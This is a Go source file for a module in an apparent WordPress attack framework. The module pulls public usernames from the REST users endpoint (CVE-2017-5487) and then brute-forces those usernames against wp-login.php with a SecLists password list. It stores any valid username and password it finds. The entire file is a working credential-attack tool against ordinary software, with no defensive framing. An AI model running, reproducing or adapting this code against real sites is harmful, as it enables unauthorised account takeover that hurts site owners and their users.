// access-enum-login-chain: enumerate public WordPress usernames, then brute
// force those usernames against wp-login.php using a SecLists password list.
package access

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/registry"
)

// UsernameEnumBrute chains REST username enumeration into login brute force.
type UsernameEnumBrute struct{}

func init() { registry.Register(UsernameEnumBrute{}) }

// Meta implements module.Module.
func (UsernameEnumBrute) Meta() module.Meta {
	return module.Meta{
		ID:        "access-enum-login-chain",
		Name:      "REST username enumeration > wp-login brute",
		Component: "WordPress REST users + wp-login.php",
		Primitive: module.PrimitiveAccess,
		AuthLevel: module.AuthNone,
		References: []string{
			"CVE-2017-5487",
			"/wp-json/wp/v2/users",
		},
		Notes: "Enumerates public user slugs through the REST users endpoint, then tests only those slugs against the configured password list.",
	}
}

// Params implements module.Module.
func (UsernameEnumBrute) Params() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "passlist", Label: "Passwords (preset/URL/file/inline)", Default: "seclists:passwords-top500"},
	}
}

type enumeratedUser struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
	Slug string `json:"slug"`
}

// Run implements module.Module.
func (UsernameEnumBrute) Run(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) *module.Result {
	res := &module.Result{Artifacts: map[string]string{}}
	users, route, err := enumerateUsernames(ctx, t)
	if err != nil {
		res.Summary = "username enumeration unavailable: " + err.Error()
		log.Warnf("%s", res.Summary)
		return res
	}
	if len(users) == 0 {
		res.Summary = "username endpoint returned no usable slugs"
		log.Warnf("%s", res.Summary)
		return res
	}

	log.Successf("enumerated %d usernames via %s", len(users), route)
	for _, user := range users {
		log.Infof("candidate username: %s", user)
	}
	res.Artifacts["usernames"] = strings.Join(users, ",")
	res.Artifacts["enum_route"] = route

	passes := resolveList(ctx, params["passlist"], "admin,password,123456", log)
	log.Infof("brute: %d enumerated users x %d passwords", len(users), len(passes))
	for _, user := range users {
		for _, pass := range passes {
			if ctx.Err() != nil {
				res.Summary = "cancelled"
				return res
			}
			if !tryLogin(ctx, t, user, pass) {
				continue
			}
			log.Successf("valid enumerated credentials: %s / %s", user, pass)
			res.Success = true
			res.Summary = fmt.Sprintf("valid enumerated login: %s:%s", user, pass)
			res.Artifacts["username"] = user
			res.Artifacts["password"] = pass
			res.Creds = &module.Credentials{Username: user, Password: pass}
			return res
		}
	}

	res.Summary = fmt.Sprintf("enumerated %d users; no valid password found", len(users))
	log.Warnf("%s", res.Summary)
	return res
}

// enumerateUsernames uses the verified REST route and its rest_route fallback.
func enumerateUsernames(ctx context.Context, t *module.Target) ([]string, string, error) {
	routes := []string{"/wp-json/wp/v2/users", "/?rest_route=/wp/v2/users"}
	var lastCode int
	var lastErr error
	for _, route := range routes {
		code, body, err := t.Client.Get(ctx, route)
		lastCode, lastErr = code, err
		if err != nil || code != 200 {
			continue
		}
		var records []enumeratedUser
		if err := json.Unmarshal([]byte(body), &records); err != nil {
			lastErr = err
			continue
		}
		seen := make(map[string]struct{}, len(records))
		users := make([]string, 0, len(records))
		for _, record := range records {
			slug := strings.TrimSpace(record.Slug)
			if slug == "" {
				continue
			}
			if _, exists := seen[slug]; exists {
				continue
			}
			seen[slug] = struct{}{}
			users = append(users, slug)
		}
		return users, route, nil
	}
	if lastErr != nil {
		return nil, "", lastErr
	}
	return nil, "", fmt.Errorf("users endpoint returned HTTP %d", lastCode)
}

var _ module.Module = UsernameEnumBrute{}
